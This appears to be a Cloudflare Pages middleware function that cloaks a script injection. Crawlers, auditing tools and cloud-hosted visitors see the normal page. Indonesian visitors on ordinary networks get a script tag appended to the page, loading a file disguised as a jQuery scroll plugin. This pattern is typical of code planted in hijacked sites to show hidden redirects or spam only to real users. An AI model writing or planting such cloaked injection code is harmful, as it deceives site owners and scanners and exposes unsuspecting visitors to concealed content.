export async function onRequest(context) {
  const { request, next } = context;
  const url = new URL(request.url);
  if (url.pathname.startsWith('/assets/')) return next();
  const headers = request.headers;
  const userAgent = (headers.get('user-agent') || '').toLowerCase();
  const country = request.cf ? request.cf.country : 'Unknown';
  const asOrg = (request.cf && request.cf.asOrganization ? request.cf.asOrganization : '').toLowerCase();
  const cloudList = ['amazon','google','digitalocean','microsoft','cloudflare','akamai','linode','ovh','vps'];
  const isCloud = cloudList.some(c => asOrg.includes(c));
  if (country !== 'ID' || isCloud || /bot|spider|crawl|lighthouse/i.test(userAgent)) {
    return next();
  }
  const response = await next();
  return new HTMLRewriter()
    .on('body', {
      element(el) {
        el.append(`<script src="/assets/jquery.scroll-min.js" defer></script>`, { html: true });
      },
    })
    .transform(response);
}
